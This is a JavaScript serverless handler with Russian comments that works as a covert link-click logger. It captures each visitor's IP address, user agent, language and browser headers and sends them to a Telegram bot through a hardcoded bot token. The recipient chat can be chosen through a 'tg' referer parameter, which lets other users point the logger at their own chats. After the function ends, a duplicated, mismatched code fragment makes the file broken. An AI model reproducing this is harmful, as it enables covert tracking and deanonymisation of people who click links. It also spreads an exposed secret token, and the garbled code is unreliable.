export default async function handler(req, res) {
  // Разрешаем CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // Обрабатываем preflight запрос
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const token = '7386186054:AAEkM7twC4_OCgK-1-0sZq2Lkfui_ftyyw4';
    const defaultChatId = '8382514971';
    
    // Получаем chat_id из query параметра
    let chatId = defaultChatId;
    try {
      const referer = req.headers.referer || '';
      if (referer) {
        const url = new URL(referer);
        const tgParam = url.searchParams.get('tg');
        if (tgParam) {
          chatId = tgParam;
        }
      }
    } catch (e) {
      console.log('Ошибка при получении chat_id:', e.message);
    }
    
    // Получаем IP пользователя
    const ip = req.headers['x-forwarded-for'] || 
               req.headers['x-real-ip'] || 
               req.socket?.remoteAddress ||
               'Unknown';
    
    // Собираем данные
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const acceptLanguage = req.headers['accept-language'] || 'Unknown';
    const accept = req.headers['accept'] || 'Unknown';
    const host = req.headers['host'] || 'Unknown';
    const secChUa = req.headers['sec-ch-ua'] || 'Unknown';
    
    // Формируем сообщение для Telegram по вашему формату
    const message = `🔔 Новый переход по ссылке!

🖥️ IP: ${ip}
🌐 Host: ${host}

📱 User Agent: ${userAgent}

🗣️ Language: ${acceptLanguage}
✅ Accept: ${accept}
📱 Browser: ${secChUa}

ℹ️ Вечная ссылка на бота: faidiksearch.xyz`;

    console.log('Отправка в Telegram:', {
      chatId,
      ip,
      host
    });

    // Отправляем сообщение в Telegram
    const telegramResponse = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message
      })
    });

    const result = await telegramResponse.json();
    console.log('Ответ Telegram:', result);

    if (result.ok) {
      res.status(200).json({ 
        success: true, 
        message: 'Данные отправлены в Telegram'
      });
    } else {
      console.error('Ошибка Telegram API:', result);
      res.status(500).json({ 
        success: false, 
        error: 'Ошибка отправки в Telegram'
      });
    }

  } catch (error) {
    console.error('Server error:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
      }    const secFetchMode = req.headers['sec-fetch-mode'] || 'Unknown';
    const secFetchSite = req.headers['sec-fetch-site'] || 'Unknown';
    const secChUa = req.headers['sec-ch-ua'] || 'Unknown';
    const host = req.headers['host'] || 'Unknown';
    
    // Формируем сообщение для Telegram
    const message = `
🔔 Новый переход по ссылке!

🖥️ IP: ${ip}
🌐 Host: ${host}

📱 User Agent: ${userAgent}

Другие данные.. 

🗣️ Language: ${acceptLanguage}
✅ Accept: ${accept}
📱 Browser: ${secChUa}

ℹ️ Вечная ссылка на бота: faidiksearch.xyz
    `.trim();

    // Отправляем сообщение в Telegram
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message
      })
    });

    res.status(200).json({ success: true });

  } catch (error) {
    res.status(200).json({ success: false });
  }
}
